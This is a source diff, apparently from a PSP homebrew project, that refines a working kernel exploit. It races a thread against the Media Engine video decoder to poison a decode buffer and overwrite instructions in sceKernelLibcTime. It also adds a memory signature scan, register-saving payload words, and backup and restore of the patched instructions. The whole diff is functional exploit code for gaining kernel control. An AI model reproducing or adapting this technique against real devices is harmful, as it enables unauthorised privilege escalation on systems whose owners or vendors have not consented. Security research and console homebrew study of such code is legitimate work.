@@ -48,7 +48,9 @@ extern int sceVideocodecDecode(me_vdecode_t *packet, u32 mode);
     me_params_t     : 0x14 bytes
     ME DCWBI range  : 0x100 bytes
 */
+
 static volatile u8 meBuffer[0x174] __attribute__((aligned(64)));
+static volatile u32 instrBackup[0x6];
 
 static volatile int isExploited = 0;
 static volatile u32 libcTimeAddr = 0;
@@ -81,29 +83,38 @@ static u64 __attribute__((aligned(64))) kernelRead64(u32 addr) {
 }
 
 static u32 getLibcTimeAddress() {
-  /*
-      This is the signature that we are looking for.
-      For some reason, ghidra recognizes a 0x08
-      instead of 0x0a on the jump.
-
-      0000f7e0 09 f8 a0 00     jalr       a1
-      0000f7e4 00 00 00 00     _nop
-      0000f7e8 f2 3d 00 08     j          LAB_0000f7c8
-      0000f7ec 21 30 40 00     _move      a2,v0
-  */
-
-  const u64 firstSig = 0x0000000000a0f809;
-  const u64 secSig = 0x004030210a003df2;
+  const u64 firstSig = 0x0000000000a0f809ULL;  // Looking for : jalr a1; nop;
+  const u64 secSig =
+      0x0040302108000000ULL;  // Looking for : j LABEL; move a2, v0;
   u32 targAddr = 0x88000000;
 
   int doContinue = 1;
   u32 result = 0;
   while (targAddr < 0x883FFFF0 && doContinue) {
     if (kernelRead64(targAddr) == firstSig) {
-      if (kernelRead64(targAddr + 8) == secSig) {
-        result = targAddr - 76;  // Our sig is at the end, so back up
-        doContinue = 0;
+      if ((kernelRead64(targAddr + 8) & 0xFFFFFFFF08000000ULL) == secSig) {
+        doContinue = 0;  // No early return for a clean control flow
       }
+    }
+
+    targAddr += 4;
+  }
+
+  if (doContinue) {
+    return result;
+  }
+
+  const u32 endAddr = targAddr;
+  const u64 thirdSig =
+      0x8c6500003c030000ULL;  // Looking for lui v1, 0x1; lw a1, offset(v1)
+
+  doContinue = 1;
+  targAddr -= 4 * 25;  // Back up about 25 instructions
+
+  while (targAddr < endAddr && doContinue) {
+    if ((kernelRead64(targAddr) & 0xFFFF0000FFFF0000ULL) == thirdSig) {
+      result = targAddr;
+      doContinue = 0;
     }
 
     targAddr += 4;
@@ -117,8 +128,12 @@ static int __attribute__((aligned(64))) poisonBuffer(u32 args, void *argp) {
   const u32 targetAddr = libcTimeAddr + 4;
 
   while (1) {
+    decodeData->payload2_0x28 = 0xafb00000;  // Save $s0 in stack
+    decodeData->payload3_0x38 = 0xafbf0004;  // Save $ra in stack
+
     // Inject the address of the libc time instructions we want to overwrite
     decodeData->params_0x10 = (me_params_t *)(targetAddr);
+
     sceKernelDelayThread(0);
   }
 
@@ -131,10 +146,10 @@ static int stopExploit() {
 }
 
 static void cleanupKernel() {
-  // Repair the 3 instructions we modified
-  *(u32 *)(libcTimeAddr + 0x04) = 0x8c654404;
-  *(u32 *)(libcTimeAddr + 0x10) = 0x001b1ac0;
-  *(u32 *)(libcTimeAddr + 0x14) = 0x03608021;
+  // Repair the instructions we modified
+  for (u32 i = 0; i < 6; i++) {
+    *(u32 *)(libcTimeAddr + i * 4) = instrBackup[i];
+  }
 }
 
 int compromiseKernel() {
@@ -142,23 +157,27 @@ int compromiseKernel() {
     return -1;
   }
 
-  /*
-      0000f798 04 44 65 8c     lw         a1,offset DAT_00014404(v1)
-      0000f79c f0 ff bd 27     addiu      sp,sp,-0x10
-      0000f7a0 00 00 b0 af     sw         s0,0x0(sp)=>local_10
-      0000f7a4 c0 1a 1b 00     sll        v1,k1,0xb
-      0000f7a8 21 80 60 03     move       s0,k1
-  */
-
-  me_vdecode_t *const decodeData = (me_vdecode_t *)meBuffer;
-  decodeData->payload1_0x24 = (u32 *)0x001b1ac0;  // Shift k1
-  decodeData->payload2_0x28 = 0x27bdfff0;         // Stack setup
-  decodeData->payload3_0x38 = 0xafb00000;         // Save s0 in stack
-
   libcTimeAddr = getLibcTimeAddress();
 
   if (!libcTimeAddr) {
     return -2;  // sceKernelLibcTime was not found
+  }
+
+  // Zero out the buffer
+  for (u32 i = 0;
+       i < (sizeof(me_vdecode_t) + sizeof(me_params_t) / sizeof(u32)); ++i) {
+    ((u32 *)(meBuffer))[i] = 0;
+  }
+
+  me_vdecode_t *const decodeData = (me_vdecode_t *)meBuffer;
+  decodeData->payload1_0x24 = (u32 *)0x27bdfff0;  // Setup the stack
+
+  // Save the instructions that we will overwrite
+  for (u32 i = 0; i < 6; i += 2) {
+    u64 instructions = kernelRead64(libcTimeAddr + 4 * i);
+
+    instrBackup[i] = (u32)instructions;              // Lo
+    instrBackup[i + 1] = (u32)(instructions >> 32);  // Hi
   }
 
   const int thid = sceKernelCreateThread("t", &poisonBuffer, 0x11, 0x10000,
@@ -182,6 +201,8 @@ int compromiseKernel() {
     // Reset the ME buffer and try decoding with normal parameters
     decodeData->params_0x10 =
         (me_params_t *)((u32)&meBuffer + sizeof(me_vdecode_t));
+    decodeData->payload2_0x28 = 0;
+    decodeData->payload3_0x38 = 0;
 
     sceVideocodecDecode(decodeData, 1);
     sceKernelDelayThread(0);
